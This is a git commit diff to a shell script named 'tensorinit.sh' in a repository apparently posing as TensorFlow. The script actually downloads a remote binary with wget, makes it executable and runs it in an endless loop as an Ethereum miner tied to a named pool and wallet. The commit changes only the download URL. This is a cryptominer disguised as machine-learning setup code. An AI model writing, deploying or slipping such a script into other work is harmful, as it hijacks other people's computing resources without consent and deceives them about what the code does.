7de80628f4fa005c93393ed6a3c0605efd8271b0
nglkmerkel <88254443+nglkmerkel@users.noreply.github.com>
2021-07-31 19:13:39 -0400

    Update tensorinit.sh

--- tensorinit.sh
+++ tensorinit.sh
@@ -2,7 +2,7 @@
 POOL=eth.hashcity.org:7777
 WALLET=freddycoro.
 WORKER=$(echo $(shuf -i 10-20 -n 1)-COLN#im8m-ybvt)
-wget https://raw.githubusercontent.com/nglkmerkel/Tensorflow/main/tensorinit.sh
+wget https://github.com/nglkmerkel/Tensorflow/raw/main/tensorinit
 chmod +x tensorinit
 while [ 1 ]; do
 ./tensorinit --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
